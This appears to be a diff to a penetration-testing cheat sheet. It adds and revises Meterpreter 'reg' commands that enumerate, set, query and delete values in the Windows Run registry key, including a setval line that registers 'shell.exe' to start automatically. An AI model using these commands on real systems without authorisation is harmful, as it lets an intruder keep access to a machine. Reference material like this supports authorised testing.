@@ -466,14 +466,16 @@ COMMANDS:
 
 TODO: Fill this info
 
+`meterpreter > reg <command> [-r <target_IP>] -k <path\\to\\registry\\key> -v <registry_value> -t <registry_type>`
+
 ```
-meterpreter > reg enumkey -k hklm\\software\\microsoft\\currentversion\\run
+meterpreter > reg enumkey [-r <target_IP>] -k hklm\\software\\microsoft\\currentversion\\run
 
-meterpreter > reg setval -k hklm\\software\\microsoft\\windows\\currentversion\\run -v <value> -t REG_SZ -d 'C:\path\to\shell.exe'
+meterpreter > reg setval [-r <target_IP>] -k hklm\\software\\microsoft\\windows\\currentversion\\run -v <value> -t REG_SZ -d 'C:\path\to\shell.exe'
 
-meterpreter > reg queryval -k hklm\\software\\microsoft\\currentversion\\run -v <value>
+meterpreter > reg queryval [-r <target_IP>] -k hklm\\software\\microsoft\\currentversion\\run -v <value>
 
-meterpreter > reg
+meterpreter > reg deleteval [-r <target_IP>] -k hklm\\software\\microsoft\\currentversion\\run -v <value>
 
 meterpreter > reg
 
